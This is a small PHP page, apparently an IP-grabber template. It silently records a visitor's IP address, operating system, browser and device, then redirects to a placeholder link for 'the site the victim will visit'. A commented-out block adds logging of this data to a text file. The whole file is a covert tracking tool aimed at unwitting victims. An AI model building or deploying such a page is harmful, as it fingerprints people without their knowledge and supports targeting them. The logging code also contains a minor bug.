<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<?php 
include('user_info.php');
$ip = UserInfo::get_ip();
$os = UserInfo::get_os();
$browser = UserInfo::get_browser();
$device = UserInfo::get_device();
if(isset($ip)){ 
header("Location: https://www.here the site link that the victim will visit.com"); 
}
/*
           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!!!!!!!  IF YOU WANT TO SAVE THE INFO IN A FILE TXT  !!!!!!!!!!!!
           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
           
$date = date(y.m.d);

    $file=fopen("info.txt" , "a");
    fwrite($file,"ip : ");
    fwrite($file, $ip ."\n");
    fwrite($file,"OS : ");
    fwrite($file, $os ."\n");
    fwrite($file,"browser : ");
    fwrite($file, $browser ."\n");
    fwrite($file,"device : ");
    fwrite($file, $device ."\n");
    fwrite($file,"date : ");
    fwrite($file, $date ."\n" ."\n");
    fclose($file);
*/
?>
<body>
</body>
</html>
